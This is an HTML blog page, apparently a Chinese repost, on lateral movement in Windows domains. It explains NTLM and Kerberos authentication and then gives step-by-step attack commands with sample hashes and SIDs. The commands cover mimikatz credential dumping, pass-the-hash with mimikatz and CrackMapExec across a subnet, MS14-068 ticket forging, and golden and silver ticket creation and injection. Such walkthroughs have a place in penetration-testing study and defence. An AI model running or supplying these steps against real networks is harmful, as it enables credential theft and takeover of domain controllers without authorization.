@@ -1,0 +1,345 @@
+<!DOCTYPE HTML>
+<html>
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<link rel="bookmark" type="image/x-icon" href="/img/logo_miccall.png">
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Kaler
+    </title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="/css/mic_main.css">
+    <link rel="stylesheet" href="/css/dropdownMenu.css">
+    <meta name="keywords" content="Kaler">
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css">
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css">
+<link rel="stylesheet" href="/css/typo.css">
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Go TOP</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special">
+            <ul class="menu links">
+			<!-- Homepage  主页  --> 
+			<li>
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </li></ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://www.Kaleryou.github.io" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="Game" href="/www.4399.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-Game"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main">
+            <div class="post_page_title_img" style="height: 25rem;background-image: url(http://pics.sc.chinaz.com/files/pic/pic9/201811/zzpic15222.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>域渗透之横向移动</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <blockquote>
+<h2 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title="Windows认证机制"></a>Windows认证机制</h2></blockquote>
+<p>工作组中使用NTLM认证，而在域内使用kerberos的认证方式</p>
+<h3 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a><strong>NTLM认证</strong></h3><p><strong>工作组中：</strong></p>
+<p>1.客户端发起认证请求 </p>
+<p>2.服务端收到认证请求，向客户端发送随机数(chanlleng/挑战)</p>
+<p>3.客户端使用NTLM Hash 打乱该随机数，生成Net-NTLM Hash,发送回服务端里会造成pth攻击</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd4728250f8dd15749ee529" alt="img"></p>
+<p><strong>域环境中：</strong></p>
+<p>比起工作组，域中多了一个域控的角色</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd66733ea3b4a487da3a816" alt="img"></p>
+<p>1.首先在Client输入username,password和domain,然后client会把password hash的值缓存在本地。</p>
+<p>2.client把username的明文发送给server（DC）</p>
+<p>3.DC会生成一个16字节的随机数，即challenge(挑战码)，再传给client</p>
+<p>4.当clinet收到challenge以后，会先复制一份出来，然后和缓存中的密码hash再一同混合hash一次，混合后的值称为response,之后client再将challenge，response及username一起都传送给server。</p>
+<p>5.server端收到client传过来的这三个值以后都转发给DC。</p>
+<p>6.当DC接过来的这三个值的以后，会根据username到域控的账号数据库(ntds.dit)里面找到该username对应的hash，然后把这个hash拿出来和传过来的chanllenge的值再混合hash.</p>
+<p>7.将(6)中混合的hash跟传来的response进行比较，相同则认证成功，反之，则失败，当然，如果是本地登录，所有验证肯定也全部都直接在本地进行。</p>
+<h2 id="P-T-H-Pass-The-Hash"><a href="#P-T-H-Pass-The-Hash" class="headerlink" title="P-T-H(Pass The Hash)"></a>P-T-H(Pass The Hash)</h2><p>pass-the-hash 在内网渗透中是一个很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和NTLM hash访问远程主机或服务，而不用提供明文密码 。</p>
+<ul>
+<li><p>域/工作组环境</p>
+</li>
+<li><p>可以获得hash，但是条件不允许对hash爆破</p>
+</li>
+<li><p>内网中存在机器相同的密码 </p>
+<h3 id="MIMIKATZ"><a href="#MIMIKATZ" class="headerlink" title="MIMIKATZ"></a>MIMIKATZ</h3></li>
+</ul>
+<p>mimakatz是一个非常好的工具。</p>
+<p>先获取一下hash:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa:logonpasswords</span><br></pre></td></tr></table></figure>
+<p>得到hash之后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:03bebb338e70244589ea67c7439c77ba</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd66eff2711cd136d9b212a" alt="img"></p>
+<h3 id="CRACKMAPEXEC"><a href="#CRACKMAPEXEC" class="headerlink" title="CRACKMAPEXEC"></a>CRACKMAPEXEC</h3><p>CrackMapExec 可以对C段中的主机进行批量pth<br>项目地址：<a href="https://github.com/byt3bl33d3r/CrackMapExec.git" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p>
+<p>Kali上可以直接通过apt安装：<br><code>apt-get install crackmapexec</code></p>
+<p>对192.168.0.0/24 C段进行批量pth：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec 192.168.0.0/24 -u administrator -H 03bebb338e70244589ea67c7439c77ba</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6756750f8dd1574aeeeb0" alt="img"></p>
+<h2 id="P-T-T-Pass-The-Ticket"><a href="#P-T-T-Pass-The-Ticket" class="headerlink" title="P-T-T(Pass-The-Ticket)"></a>P-T-T(Pass-The-Ticket)</h2><p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里介绍三种常见的攻击方法：MS14-068,Golden ticket,SILver Ticket.</p>
+<p>这里先讲一下Kerberos协议在域中:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 客户机将明文密码进行ntlm哈希 ，然后和时间戳一起加密。送给kdc(域控)，kdc(使用Krbtgt密码hash作为密钥)，对用户</span><br><span class="line">进行检测，成功之后创建TGT(Ticket-Granting Ticket)票证授权 。</span><br><span class="line">2. 将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</span><br><span class="line">3.然后客户端将tgt发送给域控制器KDC请求TGS(票证授权服务)票证，并且对tgt进行检测。</span><br><span class="line">4.检测成功之后,将目标服务账号的ntlm以及tgt进行加密，将加密的结果返回给客户机 。</span><br></pre></td></tr></table></figure>
+<h2 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h2><ul>
+<li>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos  TGT来获得票证.</li>
+</ul>
+<p>利用过程：</p>
+<p>1.whoami/user 得到普通域用户的sid<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a2b4db5aa603f18a1cba" alt="img"></p>
+<p>2.执行payload生成ccache:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u yifan@test.local -s S-1-5-21-4173655609-916892889-516531421-1108 -d dc-01.test.local -p A100b200</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a31350f8dd1574b42fdf" alt="img"></p>
+<p>3.使用mimikatz注入凭据:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge #清空当前机器存在的凭证`</span><br><span class="line">kerberos::ptc y:\downloads\TGT_yifan@test.local.ccache</span><br></pre></td></tr></table></figure>
+<p>显示Injecting ticket : OK就表示注入成功了～</p>
+<p>4.查看注入是否成功并且登录域控：<br>   查看klist:<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a3cd9b521a22ef55364d" alt="img"></p>
+<p>发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。`<img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a40cea3b4a487dab70d4" alt="img"></p>
+<h2 id="Golden-ticket-黄金凭据"><a href="#Golden-ticket-黄金凭据" class="headerlink" title="Golden ticket(黄金凭据)"></a>Golden ticket(黄金凭据)</h2><p>Golden ticket的作用是可以生成容易用户的tgt,在windows认证过程中，客户端将自己的信息 发送给KDC，然后KDC使用krbtgt 用户密码的hash作为密钥进行加密，生成TGT。</p>
+<p>==krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿过域控制器的权限，黄金票据可以理解为一个后门 。==</p>
+<p>伪造黄金凭据需要具备下面条件：</p>
+<ul>
+<li>krbtgt用户的hash（意味着你已经有了域控制器的权限了）</li>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>要伪造的用户名 </li>
+</ul>
+<p>先登陆域控制器，dump krbtgt用户的hash值，获取域sid:</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a7de2711cd136da23545" alt="img"></p>
+<p>切换到普通域用户的机器，生成tgt凭证,用户名为administrator:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /user:administrator  /domain:test.local /sid:S-1-5-21-4173655609-916892889-516531421  /krbtgt:4c7f31c8a46406c43c397d5b6223ff27 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+<p>然后使用mimi将凭证注入进去,攻击成功:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt test.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a854ea3b4a487dac06af" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在此权限下启动cmd：Misc:cmd</span><br></pre></td></tr></table></figure>
+<h2 id="Silver-ticket-白银票据"><a href="#Silver-ticket-白银票据" class="headerlink" title="Silver ticket (白银票据)"></a>Silver ticket (白银票据)</h2><p>silver ticket 和golden ticket 不同的是，它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机的hash进行加密，所以只能访问指定的权限。 </p>
+<p>不像Golden ticket ，是由krbtgt用户的密码hash进行加密，伪造tgt可以获得所有权限。</p>
+<p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中的ntlm hash(rc4加密)dump 下来， 然后在普通域用户机器进行伪造权限，进行ptt。</p>
+<p>首先登陆域控，dump机器hash ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6ab839b521a22ef564973" alt="img"></p>
+<p>将hash保存下来，在普通域用户机器中进行ptt </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local  /sid:S-1-5-21-4173655609-916892889-516531421  /target:dc-01.test.local  /rc4:c9ed25bfab6f59f96b60903d064a1974  /service:cifs /user:yifan /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6abef2711cd136da2ce71" alt="img"><br>这里的cifs是指的文件共享服务，有了cifs服务权限，加可以访问域控制器的文件系统。</p>
+<p>Ps：博客来源：<a href="https://e7t65s.github.io/c1y2m3.github.io/2018/10/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20/" target="_blank" rel="noopener">狗林的域渗透之横向移动手法</a></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2017/03/27/域渗透之横向移动手法/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://yoursite.com/2017/03/27/域渗透之横向移动手法/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
